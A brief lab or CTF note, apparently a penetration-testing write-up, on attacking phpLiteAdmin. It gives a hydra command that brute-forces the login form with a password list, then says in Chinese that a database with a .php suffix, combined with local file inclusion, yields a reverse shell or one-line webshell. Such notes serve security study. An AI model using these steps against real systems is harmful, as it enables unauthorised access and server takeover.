# phpliteadmin

```bash
hydra 10.129.12.161 -l 0xdf -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
```

而后可以新建数据库.php后缀数据库，协同lfi反弹shell或者一句话
